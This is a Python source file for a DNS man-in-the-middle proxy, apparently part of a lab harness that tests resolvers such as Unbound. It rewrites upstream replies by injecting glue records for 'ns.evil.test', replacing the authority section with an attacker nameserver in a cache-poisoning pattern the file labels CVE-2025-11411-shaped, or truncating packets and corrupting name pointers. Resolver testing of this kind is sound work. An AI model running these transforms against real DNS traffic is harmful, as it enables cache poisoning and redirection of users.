#!/usr/bin/env python3
"""UDP DNS MITM for StackDiff DNS-02 application-layer profiles.

Modes:
  passthrough              — forward upstream reply unchanged
  additional-glue          — append unrelated A in ADDITIONAL only
  authority-ns-glue        — pollute1 REPLACE: AUTHORITY = zone→attacker NS only
                             (CVE-2025-11411-shaped; measurement only)
  malformed-truncate         — cut the upstream reply mid-packet
  malformed-bad-pointer     — overwrite a name pointer to an invalid offset

Not a fuzzer. Deterministic transforms only.
"""

from __future__ import annotations

import argparse
import socket
import struct
import sys


def encode_name(name: str) -> bytes:
    out = bytearray()
    for label in name.rstrip(".").split("."):
        raw = label.encode("ascii")
        if len(raw) > 63:
            raise ValueError(f"label too long: {label}")
        out.append(len(raw))
        out.extend(raw)
    out.append(0)
    return bytes(out)


def skip_name(packet: bytes, offset: int) -> int:
    while offset < len(packet):
        lab = packet[offset]
        if lab == 0:
            return offset + 1
        if lab & 0xC0 == 0xC0:
            return offset + 2
        offset += 1 + (lab & 0x3F)
        if offset > len(packet):
            raise ValueError("truncated name")
    raise ValueError("bad name")


def skip_question(packet: bytes, offset: int) -> int:
    offset = skip_name(packet, offset)
    if offset + 4 > len(packet):
        raise ValueError("truncated question")
    return offset + 4


def skip_rr(packet: bytes, offset: int) -> int:
    offset = skip_name(packet, offset)
    if offset + 10 > len(packet):
        raise ValueError("truncated rr")
    rdlen = struct.unpack("!H", packet[offset + 8 : offset + 10])[0]
    end = offset + 10 + rdlen
    if end > len(packet):
        raise ValueError("truncated rdata")
    return end


def append_additional_a(packet: bytes, owner: str, ipv4: str, ttl: int = 60) -> bytes:
    """Append one ADDITIONAL A RR; bump ARCOUNT."""
    if len(packet) < 12:
        return packet
    id_, flags, qd, an, ns, ar = struct.unpack("!HHHHHH", packet[:12])
    header = struct.pack("!HHHHHH", id_, flags, qd, an, ns, ar + 1)
    ip_bytes = bytes(int(x) for x in ipv4.split("."))
    if len(ip_bytes) != 4:
        raise ValueError(f"bad ipv4: {ipv4}")
    rr = encode_name(owner) + struct.pack("!HHIH", 1, 1, ttl, 4) + ip_bytes
    return header + packet[12:] + rr


def replace_authority_ns_pollute1(
    packet: bytes,
    zone: str,
    ns_name: str,
    ttl: int = 60,
) -> bytes:
    """Vendor pollute1: keep QD+AN; AUTHORITY = only zone→ns_name; drop ADDITIONAL.

    NLnet iter_scrub_promiscuous.rpl pollute1 returns a positive A with a single
    AUTHORITY NS pointing at the attacker and no ADDITIONAL on that reply.
    Appending alongside the legitimate NS left Unbound free to keep the original
    (Lab Test Server observation).
    """
    if len(packet) < 12:
        return packet
    id_, flags, qd, an, ns, ar = struct.unpack("!HHHHHH", packet[:12])
    if qd < 1 or an < 1:
        return packet
    offset = 12
    try:
        for _ in range(qd):
            offset = skip_question(packet, offset)
        for _ in range(an):
            offset = skip_rr(packet, offset)
        ans_end = offset
    except ValueError:
        return packet

    ns_rdata = encode_name(ns_name)
    ns_rr = encode_name(zone) + struct.pack("!HHIH", 2, 1, ttl, len(ns_rdata)) + ns_rdata
    header = struct.pack("!HHHHHH", id_, flags, qd, an, 1, 0)
    return header + packet[12:ans_end] + ns_rr


def append_authority_ns_and_additional_a(
    packet: bytes,
    zone: str,
    ns_name: str,
    ipv4: str,
    ttl: int = 60,
) -> bytes:
    """Legacy helper: REPLACE authority NS and attach A glue (not vendor-exact)."""
    del ipv4  # kept in signature for call-site compat; glue via parent zone
    return replace_authority_ns_pollute1(packet, zone, ns_name, ttl)


def malformed_truncate(packet: bytes, keep: int = 20) -> bytes:
    if len(packet) <= keep:
        return packet
    return packet[:keep]


def malformed_bad_pointer(packet: bytes) -> bytes:
    """If a compression pointer exists in the answer region, poison it."""
    if len(packet) < 14:
        return malformed_truncate(packet, 14)
    data = bytearray(packet)
    for i in range(12, min(len(data) - 1, 64)):
        if data[i] & 0xC0 == 0xC0:
            data[i + 1] = 0xFF
            return bytes(data)
    return malformed_truncate(packet, 18)


def _qtype_is_a(packet: bytes) -> bool:
    """True if first question is type A."""
    if len(packet) < 12:
        return False
    try:
        offset = skip_name(packet, 12)
        if offset + 4 > len(packet):
            return False
        qtype = struct.unpack("!H", packet[offset : offset + 2])[0]
        return qtype == 1
    except ValueError:
        return False


def transform(mode: str, packet: bytes) -> bytes:
    if mode == "passthrough":
        return packet
    if mode == "additional-glue":
        return append_additional_a(packet, "ns.evil.test.", "198.51.100.66")
    if mode == "authority-ns-glue":
        # Vendor pollute1: positive A only; NS under parent (ns.attacker.stackdiff).
        if len(packet) < 12:
            return packet
        _id, flags, _qd, an, _ns, _ar = struct.unpack("!HHHHHH", packet[:12])
        rcode = flags & 0xF
        if rcode != 0 or an < 1 or not _qtype_is_a(packet):
            return packet
        return replace_authority_ns_pollute1(
            packet,
            zone="lab.stackdiff.",
            ns_name="ns.attacker.stackdiff.",
        )
    if mode == "malformed-truncate":
        return malformed_truncate(packet)
    if mode == "malformed-bad-pointer":
        return malformed_bad_pointer(packet)
    raise SystemExit(f"unknown mode: {mode}")


def serve(listen: str, port: int, upstream: str, upstream_port: int, mode: str) -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((listen, port))
    print(f"mitm mode={mode} listen={listen}:{port} upstream={upstream}:{upstream_port}", flush=True)
    while True:
        data, addr = sock.recvfrom(4096)
        up = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        up.settimeout(2.0)
        try:
            up.sendto(data, (upstream, upstream_port))
            reply, _ = up.recvfrom(4096)
        except OSError as exc:
            print(f"upstream error from {addr}: {exc}", flush=True)
            up.close()
            continue
        up.close()
        try:
            out = transform(mode, reply)
        except Exception as exc:  # noqa: BLE001 — keep proxy alive
            print(f"transform error: {exc}", flush=True)
            out = reply
        sock.sendto(out, addr)


def main() -> int:
    p = argparse.ArgumentParser(description="StackDiff DNS MITM")
    p.add_argument("--listen", default="0.0.0.0")
    p.add_argument("--port", type=int, default=53)
    p.add_argument("--upstream", default="172.30.0.10")
    p.add_argument("--upstream-port", type=int, default=53)
    p.add_argument(
        "--mode",
        default="passthrough",
        choices=(
            "passthrough",
            "additional-glue",
            "authority-ns-glue",
            "malformed-truncate",
            "malformed-bad-pointer",
        ),
    )
    args = p.parse_args()
    try:
        serve(args.listen, args.port, args.upstream, args.upstream_port, args.mode)
    except KeyboardInterrupt:
        return 0
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
